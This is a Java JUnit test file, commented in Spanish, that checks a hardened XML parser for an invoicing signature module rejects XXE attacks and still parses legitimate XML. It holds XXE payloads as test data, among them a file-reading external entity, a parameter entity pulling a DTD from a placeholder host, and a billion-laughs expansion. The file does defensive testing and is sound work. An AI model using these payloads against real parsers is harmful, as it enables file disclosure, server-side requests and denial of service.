package com.biopet.facturacion.spike;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * SPIKE FASE 3 - El parser del modulo de firma debe ser inmune a XXE.
 *
 * <p>Ninguna prueba lee un archivo real del sistema: las cargas maliciosas
 * apuntan a rutas y URLs ficticias, y lo que se verifica es que el parser
 * RECHACE el documento antes de intentar resolver nada.
 */
class XmlSeguroXxeSpikeTest {

    @Test
    @DisplayName("XXE con entidad externa a fichero: el DOCTYPE se rechaza")
    void rechazaEntidadExternaAFichero() {
        String malicioso = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE factura [
                  <!ENTITY xxe SYSTEM "file:///ruta/ficticia/que/no/se/debe/leer.txt">
                ]>
                <factura id="comprobante"><razonSocial>&xxe;</razonSocial></factura>
                """;

        Exception error = assertThrows(Exception.class, () -> XmlSeguro.parsear(malicioso));
        assertTrue(error.getMessage() != null && error.getMessage().contains("DOCTYPE"),
                "Se espera un rechazo explicito del DOCTYPE, no una resolucion silenciosa. Mensaje: "
                        + error.getMessage());
    }

    @Test
    @DisplayName("XXE con entidad de parametro externa: rechazado")
    void rechazaEntidadDeParametroExterna() {
        String malicioso = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE factura [
                  <!ENTITY % remoto SYSTEM "http://host.ficticio.invalid/evil.dtd">
                  %remoto;
                ]>
                <factura id="comprobante"/>
                """;

        assertThrows(Exception.class, () -> XmlSeguro.parsear(malicioso));
    }

    @Test
    @DisplayName("Billion laughs: rechazado por la prohibicion de DOCTYPE")
    void rechazaExpansionRecursivaDeEntidades() {
        String malicioso = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE factura [
                  <!ENTITY a "aaaaaaaaaa">
                  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
                  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
                ]>
                <factura id="comprobante"><razonSocial>&c;</razonSocial></factura>
                """;

        assertThrows(Exception.class, () -> XmlSeguro.parsear(malicioso));
    }

    @Test
    @DisplayName("DTD externa declarada: rechazada")
    void rechazaDtdExterna() {
        String malicioso = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE factura SYSTEM "http://host.ficticio.invalid/factura.dtd">
                <factura id="comprobante"/>
                """;

        assertThrows(Exception.class, () -> XmlSeguro.parsear(malicioso));
    }

    @Test
    @DisplayName("El parser endurecido sigue leyendo XML legitimo, con namespaces")
    void aceptaXmlLegitimo() throws Exception {
        String valido = """
                <factura xmlns:ds="http://www.w3.org/2000/09/xmldsig#" id="comprobante" version="2.1.0">
                  <infoTributaria><razonSocial>EMISOR DE PRUEBA</razonSocial></infoTributaria>
                </factura>
                """;

        Document documento = assertDoesNotThrow(() -> XmlSeguro.parsear(valido));
        assertEquals("factura", documento.getDocumentElement().getNodeName());
        assertEquals("comprobante", documento.getDocumentElement().getAttribute("id"));
        assertEquals("EMISOR DE PRUEBA",
                documento.getElementsByTagName("razonSocial").item(0).getTextContent());
    }

    @Test
    @DisplayName("La factoria endurecida declara la configuracion esperada")
    void factoriaConfiguradaDeFormaSegura() throws Exception {
        var factory = XmlSeguro.factoriaEndurecida();

        assertTrue(factory.getFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING));
        assertTrue(factory.getFeature("http://apache.org/xml/features/disallow-doctype-decl"));
        assertFalse(factory.getFeature("http://xml.org/sax/features/external-general-entities"));
        assertFalse(factory.getFeature("http://xml.org/sax/features/external-parameter-entities"));
        assertFalse(factory.isXIncludeAware());
        assertFalse(factory.isExpandEntityReferences());
        assertTrue(factory.isNamespaceAware(), "XML-DSig exige namespace awareness");
    }
}
